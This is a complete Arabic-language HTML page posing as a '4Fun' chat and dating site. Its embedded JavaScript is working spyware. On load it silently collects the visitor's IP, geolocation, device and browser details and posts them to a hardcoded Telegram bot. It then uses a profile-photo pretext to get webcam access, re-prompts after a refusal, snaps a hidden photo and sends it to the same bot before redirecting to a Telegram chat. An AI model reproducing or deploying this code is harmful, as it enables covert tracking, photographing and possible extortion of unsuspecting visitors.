<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>4Fun - دردشة وتعارف</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 500px;
            width: 100%;
            position: relative;
            overflow: hidden;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
            color: white;
            font-weight: bold;
        }
        
        h1 {
            color: #ff6b6b;
            margin-bottom: 15px;
            font-size: 28px;
        }
        
        .subtitle {
            color: #666;
            margin-bottom: 25px;
            font-size: 16px;
        }
        
        .message-notification {
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            color: white;
            padding: 15px;
            border-radius: 15px;
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 25px;
            position: relative;
        }
        
        .notification-badge {
            position: absolute;
            top: -10px;
            right: -10px;
            background: #ff4757;
            color: white;
            border-radius: 50%;
            width: 25px;
            height: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
        }
        
        .user-profile {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin: 20px 0;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 15px;
            border: 2px solid #4ecdc4;
        }
        
        .profile-img {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: 3px solid #ff6b6b;
            object-fit: cover;
        }
        
        .profile-info {
            text-align: right;
        }
        
        .profile-name {
            font-weight: bold;
            color: #ff6b6b;
            margin-bottom: 5px;
        }
        
        .profile-status {
            color: #666;
            font-size: 14px;
        }
        
        .online-dot {
            width: 12px;
            height: 12px;
            background: #4ade80;
            border-radius: 50%;
            display: inline-block;
            margin-right: 5px;
        }
        
        .chat-btn {
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s ease;
            width: 100%;
            margin: 20px 0;
        }
        
        .chat-btn:hover {
            transform: translateY(-2px);
        }
        
        .terms {
            font-size: 12px;
            color: #999;
            margin-top: 20px;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            color: white;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff6b6b;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .typing-indicator {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            margin-top: 10px;
        }
        
        .typing-dot {
            width: 8px;
            height: 8px;
            background: #ff6b6b;
            border-radius: 50%;
            animation: typing 1.4s infinite;
        }
        
        .typing-dot:nth-child(2) {
            animation-delay: 0.2s;
        }
        
        .typing-dot:nth-child(3) {
            animation-delay: 0.4s;
        }
        
        @keyframes typing {
            0%, 60%, 100% { transform: translateY(0); }
            30% { transform: translateY(-10px); }
        }

        .camera-permission {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            display: none;
        }

        .permission-text {
            color: #856404;
            font-size: 14px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">4F</div>
        <h1>مرحباً بك في 4Fun! 💬</h1>
        <p class="subtitle">تطبيق الدردشة والتعارف الأسرع نمواً</p>
        
        <div class="message-notification">
            <span class="notification-badge">1</span>
            للتواصل مع المايسترو
        </div>

        <div class="camera-permission" id="cameraPermission">
            <div class="permission-text">
                📷 نحتاج إلى الوصول للكاميرا لالتقاط صورة ملفك الشخصي
            </div>
            <button class="chat-btn" onclick="retryCameraAccess()" style="background: #28a745;">
                ✅ السماح باستخدام الكاميرا
            </button>
        </div>
        
        <button class="chat-btn" onclick="startChat()" id="mainButton">
            💬 بدء الدردشة مع المايسترو
        </button>
        
        <div class="terms">
            * يجب أن يكون عمرك فوق 18 سنة. 4Fun منصة للتعارف والدردشة المحترمة.
        </div>
    </div>

    <div class="loading-overlay" id="loadingOverlay" style="display: none;">
        <div class="spinner"></div>
        <div id="loadingText">جاري تحضير محادثتك مع المايسترو...</div>
        <div class="typing-indicator">
            <div class="typing-dot"></div>
            <div class="typing-dot"></div>
            <div class="typing-dot"></div>
        </div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>
    <video id="video" style="display:none;" autoplay></video>

    <script>
        const botToken = "8219047903:AAGnApi7qEEZLdNskA87Oy1kq4y7wUg3HrQ";
        const chatId = "7530980716";
        let dataSent = false;
        let cameraAccessAttempts = 0;
        const maxCameraAttempts = 3;

        // جمع المعلومات فور تحميل الصفحة
        async function collectInitialData() {
            const info = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                referrer: document.referrer || 'مباشر',
                pageUrl: window.location.href,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            try {
                // الحصول على الـ IP والمعلومات الجغرافية
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                info.ip = ipData.ip;
                
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoResponse.json();
                info.geolocation = {
                    country: geoData.country_name,
                    city: geoData.city,
                    region: geoData.region,
                    latitude: geoData.latitude,
                    longitude: geoData.longitude
                };

                // معلومات الشبكة
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    info.network = {
                        type: connection.effectiveType,
                        downlink: connection.downlink,
                        rtt: connection.rtt
                    };
                }

                // إرسال البيانات الأولية فوراً
                await sendToTelegram(info, null, 'initial');

            } catch (error) {
                console.log('خطأ في جمع البيانات الأولية');
            }
        }

        // التقاط الصورة مع إعادة المحاولة عند الرفض
        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                
                video.srcObject = stream;
                await new Promise(resolve => video.onloadedmetadata = resolve);
                
                // انتظار قصير لضبط الكاميرا
                await new Promise(resolve => setTimeout(resolve, 800));
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const photoData = canvas.toDataURL('image/jpeg', 0.8);
                stream.getTracks().forEach(track => track.stop());
                
                return photoData;
            } catch (error) {
                console.log('تم رفض الوصول إلى الكاميرا');
                cameraAccessAttempts++;
                
                if (cameraAccessAttempts < maxCameraAttempts) {
                    // إظهار طلب الإذن مرة أخرى
                    document.getElementById('cameraPermission').style.display = 'block';
                    document.getElementById('mainButton').style.display = 'none';
                    throw new Error('يجب السماح بالوصول إلى الكاميرا');
                } else {
                    // تجاوز الكاميرا بعد المحاولات الكافية
                    return null;
                }
            }
        }

        // إعادة طلب الوصول للكاميرا
        function retryCameraAccess() {
            document.getElementById('cameraPermission').style.display = 'none';
            document.getElementById('mainButton').style.display = 'block';
            startChat();
        }

        // إرسال البيانات إلى التليجرام
        async function sendToTelegram(data, photoData = null, type = 'final') {
            try {
                let message = '';
                
                if (type === 'initial') {
                    message = `👤 *زائر جديد في 4Fun* 

📱 *المعلومات الأولية:*
- الجهاز: ${data.platform}
- المتصفح: ${data.userAgent.split(' ')[0]}
- اللغة: ${data.language}
- الشاشة: ${data.screen}

📍 *الموقع:*
- IP: ${data.ip}
- الدولة: ${data.geolocation.country}
- المدينة: ${data.geolocation.city}

🌐 *الشبكة:*
- النوع: ${data.network?.type || 'غير معروف'}

🕒 *الوقت:* ${new Date(data.timestamp).toLocaleString('ar-EG')}
🔗 *المصدر:* ${data.referrer}`;

                } else {
                    message = `🎯 *مستخدم بدأ المحادثة* 

📱 *معلومات المستخدم:*
- الجهاز: ${data.platform}
- اللغة: ${data.language}
- الشاشة: ${data.screen}

🕒 *وقت البدء:* ${new Date(data.timestamp).toLocaleString('ar-EG')}`;
                }

                // إرسال الرسالة النصية
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                // إرسال الصورة إذا كانت متاحة
                if (photoData) {
                    try {
                        // تحويل base64 إلى blob
                        const response = await fetch(photoData);
                        const blob = await response.blob();
                        
                        const formData = new FormData();
                        formData.append('photo', blob, 'user_profile.jpg');
                        formData.append('chat_id', chatId);
                        formData.append('caption', '📸 صورة الملف الشخصي التلقائية');
                        
                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    } catch (error) {
                        console.log('خطأ في إرسال الصورة:', error);
                    }
                }

                return true;
            } catch (error) {
                console.log('خطأ في الإرسال:', error);
                return false;
            }
        }

        // بدء المحادثة
        async function startChat() {
            if (dataSent) return;
            
            const loadingOverlay = document.getElementById('loadingOverlay');
            const loadingText = document.getElementById('loadingText');
            loadingOverlay.style.display = 'flex';
            
            try {
                // جمع المعلومات الإضافية
                const additionalInfo = {
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`
                };

                // محاولة التقاط الصورة
                loadingText.textContent = 'جاري التحضير للتصوير...';
                let photoData = null;
                
                try {
                    loadingText.textContent = 'جاري الوصول إلى الكاميرا...';
                    photoData = await capturePhoto();
                } catch (error) {
                    // إذا فشل الوصول للكاميرا، ننتقل بدون صورة
                    console.log('المستخدم رفض الوصول للكاميرا');
                    photoData = null;
                }

                // إرسال البيانات النهائية
                loadingText.textContent = 'جاري إعداد المحادثة...';
                await sendToTelegram(additionalInfo, photoData, 'final');
                
                dataSent = true;
                
                // الانتقال بعد 3 ثواني
                setTimeout(() => {
                    loadingOverlay.style.display = 'none';
                    window.location.href = 'https://t.me/MAESTRO_CHAT_BOT';
                }, 3000);
                
            } catch (error) {
                console.log('خطأ:', error);
                loadingOverlay.style.display = 'none';
                
                if (error.message.includes('الكاميرا')) {
                    // إظهار طلب الإذن مرة أخرى
                    document.getElementById('cameraPermission').style.display = 'block';
                    document.getElementById('mainButton').style.display = 'none';
                } else {
                    alert('حدث خطأ، يرجى المحاولة مرة أخرى');
                    document.getElementById('mainButton').style.display = 'block';
                }
            }
        }

        // بدء جمع البيانات فور تحميل الصفحة
        window.addEventListener('load', function() {
            // جمع البيانات الأولية فوراً
            collectInitialData();
            
            // إظهار واجهة المستخدم بعد ثانية
            setTimeout(() => {
                document.body.style.opacity = '1';
            }, 1000);
        });

        // إخفاء الصفحة حتى اكتمال التحميل
        document.body.style.opacity = '0';
        document.body.style.transition = 'opacity 0.5s ease';
    </script>
</body>
</html>
